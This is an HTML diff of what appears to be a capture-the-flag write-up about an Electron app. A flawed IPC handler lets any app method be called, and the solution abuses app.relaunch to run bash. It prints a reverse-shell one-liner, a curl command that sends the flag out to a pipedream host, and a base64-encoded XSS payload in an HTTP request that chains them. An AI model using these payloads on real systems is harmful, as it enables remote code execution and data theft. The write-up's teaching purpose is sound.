+      <span class="na">contextIsolation</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+      <span class="c1">// SECURITY: disable the remote module</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#remote-module</span>
+      <span class="na">enableRemoteModule</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+      <span class="c1">// SECURITY: sanitize JS values that cross the contextBridge</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#rule-3</span>
+      <span class="na">worldSafeExecuteJavaScript</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+      <span class="c1">// SECURITY: restrict dev tools access in the packaged app</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#restrict-dev-tools</span>
+      <span class="na">devTools</span><span class="p">:</span> <span class="o">!</span><span class="nx">app</span><span class="p">.</span><span class="nx">isPackaged</span><span class="p">,</span>
+      <span class="c1">// SECURITY: disable navigation via middle-click</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#disable-new-window</span>
+      <span class="na">disableBlinkFeatures</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Auxclick</span><span class="dl">"</span><span class="p">,</span>
+      <span class="c1">// SECURITY: sandbox renderer content</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#sandbox</span>
+      <span class="na">sandbox</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+
+    <span class="p">}</span>
+  <span class="p">})</span>
+</code></pre></div></div>
+
+<p>The interesting one which we should focus on are (you can find details on these flags from the link mentioned in the comments):</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">nodeIntegration</span><span class="p">:</span> <span class="kc">false</span>
+ <span class="nx">contextIsolation</span><span class="p">:</span> <span class="kc">true</span>
+ <span class="nx">sandbox</span><span class="p">:</span> <span class="kc">true</span>
+</code></pre></div></div>
+
+<p>If <code class="language-plaintext highlighter-rouge">nodeIntegration</code> was set to true , by using this code it would have been possible to get RCE</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">shell</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">);</span> 
+<span class="nx">shell</span><span class="p">.</span><span class="nf">openExternal</span><span class="p">(</span><span class="dl">'</span><span class="s1">file:C:/Windows/System32/calc.exe</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>At first I even looked at the cool research done by Electrovolt team, to check if the challenge solution is based upon their research or not . The electron and chrome version used in this challenge was pretty old too</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) REL/1.0.0 Chrome/94.0.4606.81 Electron/15.5.7 Safari/537.36
+</code></pre></div></div>
+
+<p>I thought this challenge requires writing a renderer exploit (as the chrome version is old you can find many exploits) but as I don’t have any idea about how they work :( ,  so I started checking some other codes.</p>
+
+<p><code class="language-plaintext highlighter-rouge">preload.js</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">ipcRenderer</span><span class="p">,</span> <span class="nx">contextBridge</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">API_URL</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_URL</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">https://relapi.flu.xxx</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">localStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">api</span><span class="dl">"</span><span class="p">,</span> <span class="nx">API_URL</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">REPORT_ID</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">REPORT_ID</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">fail</span><span class="dl">"</span>
+<span class="nx">localStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">reportId</span><span class="dl">"</span><span class="p">,</span> <span class="nx">REPORT_ID</span><span class="p">)</span> 
+
+<span class="kd">const</span> <span class="nx">RendererApi</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">invoke</span><span class="p">:</span> <span class="p">(</span><span class="nx">action</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">)</span>  <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span><span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+
+<span class="c1">// SECURITY: expose a limted API to the renderer over the context bridge</span>
+<span class="c1">// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3</span>
+<span class="nx">contextBridge</span><span class="p">.</span><span class="nf">exposeInMainWorld</span><span class="p">(</span><span class="dl">"</span><span class="s2">api</span><span class="dl">"</span><span class="p">,</span> <span class="nx">RendererApi</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">main.js</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">RELbuy</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsell</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">,</span> <span class="nx">price</span><span class="p">,</span> <span class="nx">duration</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELinfo</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RElist</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsummary</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">userId</span><span class="p">){</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello </span><span class="dl">"</span><span class="o">+</span> <span class="nx">userId</span><span class="p">)</span> <span class="c1">// added by me</span>
+ <span class="k">return</span> 
+<span class="p">}</span>
+
+<span class="nx">ipcMain</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">_e</span><span class="p">,</span> <span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span> <span class="c1">// [2]</span>
+  <span class="c1">//if(["RELbuy", "RELsell", "RELinfo"].includes(action)){</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="sr">/^REL/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">action</span><span class="p">)){</span>
+    <span class="nx">app</span><span class="p">[</span><span class="nx">action</span><span class="p">](...</span><span class="nx">args</span><span class="p">)</span>  <span class="c1">// [3]</span>
+  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="c1">// ?? </span>
+  <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>By executing this line code, the code on line [2] will come into action:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.api.invoke("RELsummary","test")
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">action</code> variable will have this value <code class="language-plaintext highlighter-rouge">RELsummary</code> and <code class="language-plaintext highlighter-rouge">args</code> will have <code class="language-plaintext highlighter-rouge">test</code>. On line [3] , a call like this will be made. This eventually calls the RELsummary method and the console.log message will be printed</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app.RELsummary("test")
+</code></pre></div></div>
+
+<p>This looked interesting as it allows to call any method available from the <code class="language-plaintext highlighter-rouge">app</code> object (https://www.electronjs.org/docs/latest/api/app) also there is regex check which only allows actions which starts from REL (<code class="language-plaintext highlighter-rouge">/i</code> means case insensitive)</p>
+
+<p>Searching for a method under app object which starts from rel , point us to this https://www.electronjs.org/docs/latest/api/app#apprelaunchoptions</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198941664-00013eef-a978-4732-8301-2327010f4074.png" alt="image" /></p>
+
+<p>I was solving this challenge in the last moment and I had some other works to also do, so wasn’t able to solve this (as it would have taken me some time to figure it out how to achieve rce through relaunch method). After the ctf ended I checked the solution and the solution was really using <code class="language-plaintext highlighter-rouge">app.relaunch</code> method</p>
+
+<p>Thanks to @zeyu200 for this:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nf">invoke</span><span class="p">(</span><span class="dl">'</span><span class="s1">relaunch</span><span class="dl">'</span><span class="p">,{</span><span class="na">execPath</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bash</span><span class="dl">'</span><span class="p">,</span> <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">-c</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1</span><span class="dl">'</span><span class="p">]})</span> <span class="c1">// it will evaluate to the below code</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">relaunch</span><span class="p">({</span><span class="na">execPath</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bash</span><span class="dl">'</span><span class="p">,</span> <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">-c</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1</span><span class="dl">'</span><span class="p">]})</span>
+</code></pre></div></div>
+
+<p>To get the flag here’s the final poc:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nf">invoke</span><span class="p">(</span><span class="dl">'</span><span class="s1">relaunch</span><span class="dl">'</span><span class="p">,{</span><span class="na">execPath</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bash</span><span class="dl">'</span><span class="p">,</span> <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">-c</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">curl "https://en2celr7rewbul.m.pipedream.net/v2?=$(/printflag)"</span><span class="dl">'</span><span class="p">]})</span>
+</code></pre></div></div>
+
+<p>Replace the <code class="language-plaintext highlighter-rouge">houseId</code> and <code class="language-plaintext highlighter-rouge">token</code> parameter according to your accout.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /sell HTTP/2
+Host: relapi.flu.xxx
+Content-Length: 298
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) REL/1.0.0 Chrome/94.0.4606.81 Electron/15.5.7 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+{"houseId":"_yTPmi9bfl","token":"61e6887048465eed383d6d9f5cd32c86","message":"&lt;img src=x onerror=eval(atob('d2luZG93LmFwaS5pbnZva2UoJ3JlbGF1bmNoJyx7ZXhlY1BhdGg6ICdiYXNoJywgYXJnczogWyctYycsICdjdXJsICJodHRwczovL2VuMmNlbHI3cmV3YnVsLm0ucGlwZWRyZWFtLm5ldC92Mj89JCgvcHJpbnRmbGFnKSInXX0p'))&gt;","price":"1"}
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198945644-fe0cd51d-bd05-4ec0-bc0f-339bef10325d.png" alt="image" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">flag{congrats_on_your_firstRELauncHv2}</code></p>
